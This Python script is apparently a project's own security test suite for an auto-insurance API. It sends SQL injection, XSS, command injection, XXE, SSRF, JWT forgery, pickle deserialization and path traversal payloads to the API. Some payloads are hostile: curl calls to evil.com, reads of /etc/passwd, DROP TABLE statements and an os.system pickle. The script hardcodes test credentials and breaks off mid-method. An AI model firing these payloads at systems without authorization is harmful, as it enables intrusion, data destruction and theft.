#!/usr/bin/env python3
"""
Aggressive Security Testing Script for Auto Insurance System APIs

Comprehensive security testing with advanced attack vectors:
- Advanced SQL Injection (Blind, Time-based, Union-based)
- XSS (Reflected, Stored, DOM-based)
- Command Injection (OS commands, code execution)
- LDAP Injection
- XML/XXE Injection
- SSRF (Server-Side Request Forgery)
- IDOR (Insecure Direct Object References)
- Mass Assignment
- JWT Attacks (Algorithm confusion, key confusion)
- Timing Attacks
- HTTP Header Injection
- Open Redirect
- File Upload Vulnerabilities
- NoSQL Injection
- Template Injection
- Deserialization Attacks
"""

import sys
import os
import requests
import json
import time
import base64
from typing import Dict, List, Tuple, Optional
from datetime import datetime
import urllib.parse

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Configuration
API_BASE_URL = os.getenv("API_BASE_URL", "http://localhost:8000")
API_PREFIX = f"{API_BASE_URL}/api/v1"

# Test credentials
TEST_USERNAME = "driver0002"
TEST_PASSWORD = "password0002"
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "admin123"

# Colors for output
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class SecurityTestResult:
    """Represents a security test result."""
    def __init__(self, test_name: str, endpoint: str, method: str, vulnerable: bool, 
                 details: str, severity: str = "MEDIUM", payload: str = None):
        self.test_name = test_name
        self.endpoint = endpoint
        self.method = method
        self.vulnerable = vulnerable
        self.details = details
        self.severity = severity
        self.payload = payload
        self.timestamp = datetime.now()

class AggressiveSecurityTester:
    """Aggressive security testing class."""
    
    def __init__(self, base_url: str = API_BASE_URL):
        self.base_url = base_url
        self.api_prefix = f"{base_url}/api/v1"
        self.session = requests.Session()
        self.results: List[SecurityTestResult] = []
        self.auth_token: Optional[str] = None
        self.admin_token: Optional[str] = None
        
    def log_result(self, result: SecurityTestResult):
        """Log a test result."""
        self.results.append(result)
        status = f"{Colors.RED}VULNERABLE{Colors.RESET}" if result.vulnerable else f"{Colors.GREEN}SAFE{Colors.RESET}"
        print(f"[{status}] {result.test_name}")
        print(f"  Endpoint: {result.method} {result.endpoint}")
        print(f"  Severity: {result.severity}")
        if result.payload:
            print(f"  Payload: {result.payload[:100]}...")
        if result.details:
            print(f"  Details: {result.details}")
        print()
    
    def authenticate(self, username: str, password: str) -> Optional[str]:
        """Authenticate and get JWT token."""
        try:
            response = self.session.post(
                f"{self.api_prefix}/auth/login",
                json={"username": username, "password": password},
                timeout=5
            )
            if response.status_code == 200:
                return response.json().get("access_token")
        except Exception:
            pass
        return None
    
    def setup_auth(self):
        """Setup authentication tokens."""
        print(f"{Colors.BLUE}Setting up authentication...{Colors.RESET}")
        self.auth_token = self.authenticate(TEST_USERNAME, TEST_PASSWORD)
        self.admin_token = self.authenticate(ADMIN_USERNAME, ADMIN_PASSWORD)
        
        if self.auth_token:
            self.session.headers.update({"Authorization": f"Bearer {self.auth_token}"})
            print(f"{Colors.GREEN}✓ Authenticated as {TEST_USERNAME}{Colors.RESET}\n")
    
    # Advanced SQL Injection Payloads
    ADVANCED_SQL_PAYLOADS = [
        # Union-based
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT user(),database(),version()--",
        "' UNION SELECT username,password FROM users--",
        
        # Boolean-based blind
        "' OR 1=1--",
        "' OR 'a'='a",
        "' OR 1=1#",
        "1' OR '1'='1",
        "admin'--",
        "admin'/*",
        
        # Time-based blind
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "1'; SELECT pg_sleep(5)--",
        
        # Error-based
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
        
        # Stacked queries
        "'; DROP TABLE users--",
        "'; DELETE FROM users--",
        "'; UPDATE users SET password='hacked'--",
        
        # Second-order injection
        "admin' OR '1'='1",
        "1' AND '1'='1",
        
        # NoSQL injection attempts
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "this.username == this.password"}',
        
        # PostgreSQL specific
        "'; SELECT pg_sleep(5)--",
        "' UNION SELECT NULL,current_database(),NULL--",
        
        # MySQL specific
        "'; SELECT SLEEP(5)--",
        "' UNION SELECT NULL,user(),NULL--",
        
        # MSSQL specific
        "'; WAITFOR DELAY '00:00:05'--",
    ]
    
    # Advanced XSS Payloads
    ADVANCED_XSS_PAYLOADS = [
        # Basic
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        
        # Event handlers
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<div onmouseover=alert('XSS')>",
        
        # JavaScript protocols
        "javascript:alert('XSS')",
        "javascript:alert(String.fromCharCode(88,83,83))",
        "JaVaScRiPt:alert('XSS')",
        
        # Encoded
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
        
        # Bypass filters
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>eval('alert(\"XSS\")')</script>",
        "<script>window['alert']('XSS')</script>",
        
        # DOM-based
        "<iframe src=javascript:alert('XSS')>",
        "<object data=javascript:alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
        
        # SVG
        "<svg><script>alert('XSS')</script></svg>",
        "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
        
        # HTML5
        "<form><button formaction=javascript:alert('XSS')>X</button>",
        "<math><mi//xlink:href=\"javascript:alert('XSS')\">CLICK",
        
        # Polyglot (works in multiple contexts)
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>",
    ]
    
    # Command Injection Payloads
    COMMAND_INJECTION_PAYLOADS = [
        # Basic
        "; ls",
        "| ls",
        "& ls",
        "&& ls",
        "|| ls",
        
        # With commands
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "& cat /etc/passwd",
        "; id",
        "| id",
        "& id",
        
        # Command substitution
        "$(ls)",
        "`ls`",
        "${ls}",
        "$(whoami)",
        "`whoami`",
        
        # Network commands
        "; ping -c 1 127.0.0.1",
        "| ping -c 1 127.0.0.1",
        "; curl http://evil.com",
        "| curl http://evil.com",
        
        # Python code execution
        "; python -c 'import os; os.system(\"id\")'",
        "| python -c 'import os; os.system(\"id\")'",
        
        # Time-based detection
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        
        # Windows
        "& dir",
        "| dir",
        "; dir",
        "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]
    
    # LDAP Injection Payloads
    LDAP_INJECTION_PAYLOADS = [
        "*",
        "*)(&",
        "*))%00",
        "*()|&",
        "admin)(&(password=*))",
        "admin)(|(password=*))",
        "*)(uid=*))(|(uid=*",
    ]
    
    # XXE/XML Injection Payloads
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    ]
    
    # SSRF Payloads
    SSRF_PAYLOADS = [
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:5432",
        "http://127.0.0.1:6379",
        "http://localhost/admin",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "gopher://127.0.0.1:6379/_",
        "dict://127.0.0.1:11211",
    ]
    
    # JWT Attack Payloads
    JWT_ATTACKS = {
        "none_algorithm": {
            "header": {"alg": "none", "typ": "JWT"},
            "description": "JWT algorithm confusion - none algorithm"
        },
        "empty_secret": {
            "description": "JWT with empty secret"
        },
        "weak_secret": {
            "description": "JWT with weak secret (brute force)"
        }
    }
    
    def test_advanced_sql_injection(self):
        """Test for advanced SQL injection vulnerabilities."""
        print(f"{Colors.BOLD}Testing Advanced SQL Injection...{Colors.RESET}")
        
        # Test login endpoint with advanced payloads
        for payload in self.ADVANCED_SQL_PAYLOADS[:10]:  # Test first 10
            try:
                response = self.session.post(
                    f"{self.api_prefix}/auth/login",
                    json={"username": payload, "password": "test"},
                    timeout=10
                )
                
                response_text = response.text.lower()
                sql_errors = [
                    "sql syntax", "mysql", "postgresql", "sqlite", "ora-",
                    "sql error", "database error", "syntax error", "unclosed",
                    "unterminated", "quoted string", "pg_", "psql",
                    "sqlstate", "driver", "odbc", "jdbc"
                ]
                
                if any(error in response_text for error in sql_errors):
                    self.log_result(SecurityTestResult(
                        "Advanced SQL Injection - Login",
                        f"{self.api_prefix}/auth/login",
                        "POST",
                        True,
                        f"SQL error detected",
                        "HIGH",
                        payload
                    ))
                    break
                    
                # Check for time-based injection (if response took > 4 seconds)
                if response.elapsed.total_seconds() > 4:
                    self.log_result(SecurityTestResult(
                        "Time-based SQL Injection - Login",
                        f"{self.api_prefix}/auth/login",
                        "POST",
                        True,
                        f"Delayed response ({response.elapsed.total_seconds()}s) suggests time-based SQL injection",
                        "HIGH",
                        payload
                    ))
            except requests.exceptions.Timeout:
                self.log_result(SecurityTestResult(
                    "Time-based SQL Injection - Login (Timeout)",
                    f"{self.api_prefix}/auth/login",
                    "POST",
                    True,
                    "Request timeout suggests time-based SQL injection",
                    "HIGH",
                    payload
                ))
            except Exception:
                pass
        
        # Test path parameters
        if self.auth_token:
            test_driver_ids = [
                "DRV-0001' UNION SELECT NULL,NULL--",
                "DRV-0001' OR '1'='1",
                "DRV-0001'; SELECT pg_sleep(5)--",
            ]
            
            for driver_id in test_driver_ids:
                try:
                    start_time = time.time()
                    response = self.session.get(
                        f"{self.api_prefix}/drivers/{driver_id}/summary",
                        timeout=10
                    )
                    elapsed = time.time() - start_time
                    
                    response_text = response.text.lower()
                    sql_errors = ["sql syntax", "mysql", "postgresql", "database error"]
                    
                    if any(error in response_text for error in sql_errors):
                        self.log_result(SecurityTestResult(
                            "Advanced SQL Injection - Path Parameter",
                            f"/drivers/{driver_id[:30]}.../summary",
                            "GET",
                            True,
                            "SQL error detected",
                            "HIGH",
                            driver_id
                        ))
                    elif elapsed > 4:
                        self.log_result(SecurityTestResult(
                            "Time-based SQL Injection - Path Parameter",
                            f"/drivers/{driver_id[:30]}.../summary",
                            "GET",
                            True,
                            f"Delayed response ({elapsed:.2f}s)",
                            "HIGH",
                            driver_id
                        ))
                except requests.exceptions.Timeout:
                    self.log_result(SecurityTestResult(
                        "Time-based SQL Injection - Path Parameter (Timeout)",
                        f"/drivers/{driver_id[:30]}.../summary",
                        "GET",
                        True,
                        "Request timeout",
                        "HIGH",
                        driver_id
                    ))
                except Exception:
                    pass
        
        print(f"{Colors.GREEN}✓ Advanced SQL Injection tests completed{Colors.RESET}\n")
    
    def test_advanced_xss(self):
        """Test for advanced XSS vulnerabilities."""
        print(f"{Colors.BOLD}Testing Advanced XSS...{Colors.RESET}")
        
        if self.auth_token:
            for payload in self.ADVANCED_XSS_PAYLOADS[:10]:  # Test first 10
                try:
                    # Test in driver_id parameter
                    encoded_payload = urllib.parse.quote(payload)
                    response = self.session.get(
                        f"{self.api_prefix}/drivers/{encoded_payload}/summary",
                        timeout=5
                    )
                    
                    # Check if payload is reflected
                    if payload in response.text or urllib.parse.unquote(payload) in response.text:
                        # Check if it's in a dangerous context
                        if "<script>" in payload.lower() or "javascript:" in payload.lower():
                            self.log_result(SecurityTestResult(
                                "Advanced XSS - Reflected",
                                f"/drivers/{payload[:30]}.../summary",
                                "GET",
                                True,
                                "XSS payload reflected in response",
                                "MEDIUM",
                                payload
                            ))
                except Exception:
                    pass
        
        print(f"{Colors.GREEN}✓ Advanced XSS tests completed{Colors.RESET}\n")
    
    def test_command_injection(self):
        """Test for command injection vulnerabilities."""
        print(f"{Colors.BOLD}Testing Command Injection...{Colors.RESET}")
        
        if self.auth_token:
            for payload in self.COMMAND_INJECTION_PAYLOADS[:5]:  # Test first 5
                try:
                    # Test in various parameters
                    response = self.session.get(
                        f"{self.api_prefix}/drivers/DRV-0001{payload}/summary",
                        timeout=3
                    )
                    
                    # Check for command output indicators
                    response_text = response.text.lower()
                    command_outputs = [
                        "uid=", "gid=", "root:", "bin/bash", "bin/sh",
                        "total ", "drwx", "-rw-", "directory of"
                    ]
                    
                    if any(output in response_text for output in command_outputs):
                        self.log_result(SecurityTestResult(
                            "Command Injection",
                            f"/drivers/DRV-0001{payload[:20]}.../summary",
                            "GET",
                            True,
                            "Command output detected in response",
                            "CRITICAL",
                            payload
                        ))
                except requests.exceptions.Timeout:
                    # Timeout might indicate command execution
                    if "sleep" in payload.lower():
                        self.log_result(SecurityTestResult(
                            "Command Injection - Time-based",
                            f"/drivers/DRV-0001{payload[:20]}.../summary",
                            "GET",
                            True,
                            "Timeout suggests command execution",
                            "CRITICAL",
                            payload
                        ))
                except Exception:
                    pass
        
        print(f"{Colors.GREEN}✓ Command injection tests completed{Colors.RESET}\n")
    
    def test_ssrf(self):
        """Test for SSRF vulnerabilities."""
        print(f"{Colors.BOLD}Testing SSRF (Server-Side Request Forgery)...{Colors.RESET}")
        
        # Note: Currently no endpoints accept URLs, but test for future vulnerabilities
        # Check if any endpoint might make HTTP requests based on user input
        
        # Test query parameters that might be used in URLs
        if self.auth_token:
            # Test with URL-like parameters in query strings
            for payload in self.SSRF_PAYLOADS[:3]:
                try:
                    # Test if any endpoint accepts 'url' or 'callback' parameters
                    response = self.session.get(
                        f"{self.api_prefix}/drivers/DRV-0001?callback={payload}",
                        timeout=2
                    )
                    
                    # Only flag if we see actual connection attempts or protocol-specific responses
                    response_text = response.text.lower()
                    
                    # Very specific SSRF indicators
                    ssrf_indicators = [
                        "ssh-2.0",  # SSH banner
                        "220 ",  # FTP banner
                        "connection refused",  # Specific connection error
                        "connection timeout",  # Timeout error
                    ]
                    
                    if any(indicator in response_text for indicator in ssrf_indicators):
                        self.log_result(SecurityTestResult(
                            "SSRF",
                            f"/drivers/DRV-0001?callback={payload[:30]}...",
                            "GET",
                            True,
                            f"SSRF indicator detected",
                            "HIGH",
                            payload
                        ))
                except requests.exceptions.Timeout:
                    # Timeout might indicate connection attempt
                    pass
                except Exception:
                    pass
        
        print(f"{Colors.GREEN}✓ SSRF tests completed (no endpoints accept URLs){Colors.RESET}\n")
    
    def test_idor(self):
        """Test for Insecure Direct Object References."""
        print(f"{Colors.BOLD}Testing IDOR (Insecure Direct Object References)...{Colors.RESET}")
        
        if not self.auth_token:
            print(f"{Colors.YELLOW}⚠ Skipping - no authentication token{Colors.RESET}\n")
            return
        
        # Try to access other users' resources with various IDs
        test_ids = [
            "DRV-0001", "DRV-0003", "DRV-0004", "DRV-0005",
            "DRV-9999", "DRV-0000", "1", "0", "-1",
            "../DRV-0001", "..\\DRV-0001",
        ]
        
        for test_id in test_ids:
            try:
                response = self.session.get(
                    f"{self.api_prefix}/drivers/{test_id}/summary",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    # Check if we got data we shouldn't have access to
                    if data and test_id != "DRV-0002":  # DRV-0002 is our test user
                        self.log_result(SecurityTestResult(
                            "IDOR - Driver Summary",
                            f"/drivers/{test_id}/summary",
                            "GET",
                            True,
                            f"Accessible data for driver {test_id}",
                            "HIGH",
                            test_id
                        ))
            except Exception:
                pass
        
        print(f"{Colors.GREEN}✓ IDOR tests completed{Colors.RESET}\n")
    
    def test_jwt_attacks(self):
        """Test for JWT vulnerabilities."""
        print(f"{Colors.BOLD}Testing JWT Attacks...{Colors.RESET}")
        
        if not self.auth_token:
            print(f"{Colors.YELLOW}⚠ Skipping - no authentication token{Colors.RESET}\n")
            return
        
        try:
            import jwt as jwt_lib
            
            # Test 1: Algorithm confusion - none algorithm
            try:
                payload = jwt_lib.decode(self.auth_token, options={"verify_signature": False})
                
                # Try privilege escalation
                payload["is_admin"] = True
                payload["role"] = "admin"
                payload["permissions"] = ["admin", "superuser"]
                
                # Create token with none algorithm
                none_token = jwt_lib.encode(payload, "", algorithm="none")
                
                original_headers = self.session.headers.copy()
                self.session.headers.update({"Authorization": f"Bearer {none_token}"})
                
                response = self.session.get(f"{self.api_prefix}/auth/me", timeout=5)
                
                if response.status_code == 200:
                    user_data = response.json()
                    if user_data.get("is_admin"):
                        self.log_result(SecurityTestResult(
                            "JWT Algorithm Confusion - None",
                            "/auth/me",
                            "GET",
                            True,
                            "None algorithm token accepted with privilege escalation",
                            "CRITICAL",
                            "none algorithm"
                        ))
                
                self.session.headers.update(original_headers)
            except Exception:
                pass
            
            # Test 2: Algorithm confusion - HS256 to RS256
            try:
                payload = jwt_lib.decode(self.auth_token, options={"verify_signature": False})
                payload["is_admin"] = True
                
                # Try RS256 with public key
                # This would work if server accepts RS256 and we can guess/get public key
                # For now, just test if server rejects it properly
                fake_rs256_token = jwt_lib.encode(payload, "fake-key", algorithm="RS256")
                
                original_headers = self.session.headers.copy()
                self.session.headers.update({"Authorization": f"Bearer {fake_rs256_token}"})
                
                response = self.session.get(f"{self.api_prefix}/auth/me", timeout=5)
                
                if response.status_code == 200:
                    self.log_result(SecurityTestResult(
                        "JWT Algorithm Confusion - RS256",
                        "/auth/me",
                        "GET",
                        True,
                        "RS256 token accepted (algorithm confusion possible)",
                        "CRITICAL",
                        "RS256 algorithm"
                    ))
                
                self.session.headers.update(original_headers)
            except Exception:
                pass
            
            # Test 3: Weak secret brute force (sample check)
            weak_secrets = [
                "secret", "password", "123456", "admin", "test",
                "your-secret-key-change-in-production",  # Default from config
                "changeme", "default", "key", "secretkey"
            ]
            payload = jwt_lib.decode(self.auth_token, options={"verify_signature": False})
            
            for secret in weak_secrets:
                try:
                    decoded = jwt_lib.decode(self.auth_token, secret, algorithms=["HS256"])
                    self.log_result(SecurityTestResult(
                        "JWT Weak Secret",
                        "/auth/me",
                        "GET",
                        True,
                        f"Token verified with weak/default secret: {secret}",
                        "CRITICAL",
                        secret
                    ))
                    break
                except Exception:
                    pass
            
            # Test 4: Modified token (signature tampering)
            modified_token = self.auth_token[:-5] + "XXXXX"
            original_headers = self.session.headers.copy()
            self.session.headers.update({"Authorization": f"Bearer {modified_token}"})
            
            response = self.session.get(f"{self.api_prefix}/auth/me", timeout=5)
            
            if response.status_code == 200:
                self.log_result(SecurityTestResult(
                    "JWT Manipulation",
                    "/auth/me",
                    "GET",
                    True,
                    "Modified token accepted (signature validation failing)",
                    "CRITICAL",
                    "modified signature"
                ))
            
            self.session.headers.update(original_headers)
            
            # Test 5: Expired token reuse
            try:
                payload = jwt_lib.decode(self.auth_token, options={"verify_signature": False})
                # Remove expiration
                if "exp" in payload:
                    del payload["exp"]
                # Remove issued at
                if "iat" in payload:
                    del payload["iat"]
                
                # Try to create new token without expiration
                from app.config import get_settings
                settings = get_settings()
                no_exp_token = jwt_lib.encode(payload, settings.JWT_SECRET_KEY, algorithm="HS256")
                
                original_headers = self.session.headers.copy()
                self.session.headers.update({"Authorization": f"Bearer {no_exp_token}"})
                
                response = self.session.get(f"{self.api_prefix}/auth/me", timeout=5)
                
                if response.status_code == 200:
                    self.log_result(SecurityTestResult(
                        "JWT Expiration Bypass",
                        "/auth/me",
                        "GET",
                        True,
                        "Token without expiration accepted",
                        "HIGH",
                        "no expiration"
                    ))
                
                self.session.headers.update(original_headers)
            except Exception:
                pass
            
        except ImportError:
            print(f"{Colors.YELLOW}⚠ PyJWT not available for JWT testing{Colors.RESET}")
        except Exception:
            pass
        
        print(f"{Colors.GREEN}✓ JWT attack tests completed{Colors.RESET}\n")
    
    def test_mass_assignment(self):
        """Test for mass assignment vulnerabilities."""
        print(f"{Colors.BOLD}Testing Mass Assignment...{Colors.RESET}")
        
        if not self.auth_token:
            print(f"{Colors.YELLOW}⚠ Skipping - no authentication token{Colors.RESET}\n")
            return
        
        # Try to set admin flag or other privileged fields
        mass_assignment_payloads = [
            {"is_admin": True},
            {"is_admin": True, "is_active": True},
            {"role": "admin"},
            {"permissions": ["admin", "superuser"]},
        ]
        
        for payload in mass_assignment_payloads:
            try:
                # Try in user update endpoint if exists
                response = self.session.put(
                    f"{self.api_prefix}/auth/me",
                    json=payload,
                    timeout=5
                )
                
                if response.status_code == 200:
                    # Check if privilege was escalated
                    check_response = self.session.get(f"{self.api_prefix}/auth/me", timeout=5)
                    if check_response.status_code == 200:
                        user_data = check_response.json()
                        if user_data.get("is_admin") or user_data.get("role") == "admin":
                            self.log_result(SecurityTestResult(
                                "Mass Assignment",
                                "/auth/me",
                                "PUT",
                                True,
                                "Privilege escalation via mass assignment",
                                "CRITICAL",
                                str(payload)
                            ))
            except Exception:
                pass
        
        print(f"{Colors.GREEN}✓ Mass assignment tests completed{Colors.RESET}\n")
    
    def test_open_redirect(self):
        """Test for open redirect vulnerabilities."""
        print(f"{Colors.BOLD}Testing Open Redirect...{Colors.RESET}")
        
        redirect_payloads = [
            "http://evil.com",
            "https://evil.com",
            "//evil.com",
            "javascript:alert('XSS')",
            "\\evil.com",
        ]
        
        # Test in redirect parameters
        for payload in redirect_payloads:
            try:
                response = self.session.get(
                    f"{self.api_prefix}/auth/login?redirect={payload}",
                    allow_redirects=False,
                    timeout=5
                )
                
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get("Location", "")
                    if "evil.com" in location or payload in location:
                        self.log_result(SecurityTestResult(
                            "Open Redirect",
                            f"/auth/login?redirect={payload[:30]}...",
                            "GET",
                            True,
                            f"Redirects to external domain: {location}",
                            "MEDIUM",
                            payload
                        ))
            except Exception:
                pass
        
        print(f"{Colors.GREEN}✓ Open redirect tests completed{Colors.RESET}\n")
    
    def test_http_header_injection(self):
        """Test for HTTP header injection vulnerabilities."""
        print(f"{Colors.BOLD}Testing HTTP Header Injection...{Colors.RESET}")
        
        header_payloads = [
            "test\r\nSet-Cookie: malicious=value",
            "test\r\nX-Forwarded-For: 127.0.0.1",
            "test\r\nLocation: http://evil.com",
        ]
        
        for payload in header_payloads:
            try:
                response = self.session.post(
                    f"{self.api_prefix}/auth/login",
                    json={"username": payload, "password": "test"},
                    headers={"User-Agent": payload},
                    timeout=5
                )
                
                # Check if payload appears in response headers
                for header_name, header_value in response.headers.items():
                    if payload in header_value or "\r\n" in header_value:
                        self.log_result(SecurityTestResult(
                            "HTTP Header Injection",
                            "/auth/login",
                            "POST",
                            True,
                            f"Injected header detected: {header_name}",
                            "MEDIUM",
                            payload
                        ))
            except Exception:
                pass
        
        print(f"{Colors.GREEN}✓ HTTP header injection tests completed{Colors.RESET}\n")
    
    def test_timing_attacks(self):
        """Test for timing attack vulnerabilities."""
        print(f"{Colors.BOLD}Testing Timing Attacks...{Colors.RESET}")
        
        # Test login endpoint timing
        valid_user = TEST_USERNAME
        invalid_user = "nonexistent_user_12345"
        
        times_valid = []
        times_invalid = []
        
        for _ in range(5):
            try:
                start = time.time()
                self.session.post(
                    f"{self.api_prefix}/auth/login",
                    json={"username": valid_user, "password": "wrong"},
                    timeout=5
                )
                times_valid.append(time.time() - start)
            except Exception:
                pass
            
            try:
                start = time.time()
                self.session.post(
                    f"{self.api_prefix}/auth/login",
                    json={"username": invalid_user, "password": "wrong"},
                    timeout=5
                )
                times_invalid.append(time.time() - start)
            except Exception:
                pass
        
        if times_valid and times_invalid:
            avg_valid = sum(times_valid) / len(times_valid)
            avg_invalid = sum(times_invalid) / len(times_invalid)
            
            # If timing difference is significant (> 100ms), might indicate timing attack vulnerability
            if abs(avg_valid - avg_invalid) > 0.1:
                self.log_result(SecurityTestResult(
                    "Timing Attack - Username Enumeration",
                    "/auth/login",
                    "POST",
                    True,
                    f"Timing difference detected: valid={avg_valid:.3f}s, invalid={avg_invalid:.3f}s",
                    "MEDIUM",
                    "timing analysis"
                ))
        
        print(f"{Colors.GREEN}✓ Timing attack tests completed{Colors.RESET}\n")
    
    def test_nosql_injection(self):
        """Test for NoSQL injection vulnerabilities."""
        print(f"{Colors.BOLD}Testing NoSQL Injection...{Colors.RESET}")
        
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$where": "this.username == this.password"},
            {"$regex": ".*"},
            {"$exists": True},
        ]
        
        for payload in nosql_payloads:
            try:
                response = self.session.post(
                    f"{self.api_prefix}/auth/login",
                    json={"username": payload, "password": payload},
                    timeout=5
                )
                
                # Check if payload was processed as NoSQL query
                if response.status_code == 200:
                    self.log_result(SecurityTestResult(
                        "NoSQL Injection",
                        "/auth/login",
                        "POST",
                        True,
                        "NoSQL query operators processed",
                        "HIGH",
                        str(payload)
                    ))
            except Exception:
                pass
        
        print(f"{Colors.GREEN}✓ NoSQL injection tests completed{Colors.RESET}\n")
    
    def test_xxe_injection(self):
        """Test for XXE (XML External Entity) injection."""
        print(f"{Colors.BOLD}Testing XXE Injection...{Colors.RESET}")
        
        for payload in self.XXE_PAYLOADS:
            try:
                # Test if any endpoint accepts XML
                response = self.session.post(
                    f"{self.api_prefix}/telematics/events",
                    data=payload,
                    headers={"Content-Type": "application/xml"},
                    timeout=5
                )
                
                # Check for file contents in response
                if "/etc/passwd" in response.text or "root:" in response.text:
                    self.log_result(SecurityTestResult(
                        "XXE Injection",
                        "/telematics/events",
                        "POST",
                        True,
                        "File contents detected in response",
                        "CRITICAL",
                        payload[:50]
                    ))
            except Exception:
                pass
        
        print(f"{Colors.GREEN}✓ XXE injection tests completed{Colors.RESET}\n")
    
    def test_deserialization(self):
        """Test for insecure deserialization vulnerabilities."""
        print(f"{Colors.BOLD}Testing Deserialization Attacks...{Colors.RESET}")
        
        if not self.auth_token:
            print(f"{Colors.YELLOW}⚠ Skipping - no authentication token{Colors.RESET}\n")
            return
        
        # Python pickle payload (dangerous if deserialized)
        try:
            import pickle
            import base64
            
            class MaliciousPayload:
                def __reduce__(self):
                    import os
                    return (os.system, ('echo "deserialization_test"',))
            
            pickled = pickle.dumps(MaliciousPayload())
            encoded = base64.b64encode(pickled).decode()
            
            # Test various endpoints that might deserialize data
            test_endpoints = [
                (f"{self.api_prefix}/data-generator/generate-batch", {"driver_id": "DRV-0001", "count": 1, "data": encoded}),
                (f"{self.api_prefix}/telematics/events", {"event_data": encoded}),
            ]
            
            for endpoint, payload in test_endpoints:
                try:
                    response = self.session.post(
                        endpoint,
                        json=payload,
                        timeout=3
                    )
                    
                    # Check if command was executed (look for output)
                    if "deserialization_test" in response.text:
                        self.log_result(SecurityTestResult(
                            "Insecure Deserialization - Code Execution",
                            endpoint,
                            "POST",
                            True,
                            "Pickle deserialization led to code execution",
                            "CRITICAL",
                            "pickle payload"
                        ))
                except Exception:
                    pass
            
            # Test JSON deserialization with prototype pollution
            json_payloads = [
                {"__proto__": {"isAdmin": True}},
                {"constructor": {"prototype": {"isAdmin": True}}},
            ]
            
            for payload in json_payloads:
                try:
                    response = self.session.post(
                        f"{self.api_prefix}/auth/register",
                        json={
                            "username": f"test{int(time.time())}",
                            "password": "test123",
                            "email": f"test{int(time.time())}@test.com",
                            **payload
                        },
                        timeout=5
                    )
                    
                    if response.status_code == 201:
                        user_data = response.json()
                        # Check if prototype pollution worked
                        if hasattr(user_data, 'isAdmin') or user_data.get('isAdmin'):
                            self.log_result(SecurityTestResult(
                                "Prototype Pollution",
                                "/auth/register",
                                "POST",
                                True,
                                "Prototype pollution detected",
                                "HIGH",
                                str(payload)
                            ))
                except Exception:
                    pass
                    
        except ImportError:
            pass
        except Exception:
            pass
        
        print(f"{Colors.GREEN}✓ Deserialization tests completed{Colors.RESET}\n")
    
    def test_path_traversal_advanced(self):
        """Test for advanced path traversal vulnerabilities."""
        print(f"{Colors.BOLD}Testing Advanced Path Traversal...{Colors.RESET}")
        
        advanced_path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
            "....\\\\....\\\\....\\\\etc\\\\passwd",
            "..%252f..%252f..%252fetc%252fpasswd",  # Double encoding
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # UTF-8 encoding
        ]
        
        if self.auth_token:
            for payload in advanced_path_payloads:
                try:
                    response = self.session.get(
                        f"{self.api_prefix}/drivers/{payload}/summary",
                        timeout=5
                    )
                    
                    # Check for file contents
                    if "root:" in response.text or "bin/bash" in response.text or "[boot loader]" in response.text:
                        self.log_result(SecurityTestResult(
                            "Advanced Path Traversal",
                            f"/drivers/{payload[:30]}.../summary",
                            "GET",
                            True,
                            "File contents detected",
                            "CRITICAL",
                            payload
                        ))
                except Exception:
                    pass
        
        print(f"{Colors.GREEN}✓ Advanced path traversal tests completed{Colors.RESET}\n")
    
    def test_ldap_injection(self):
        """Test for LDAP injection vulnerabilities."""
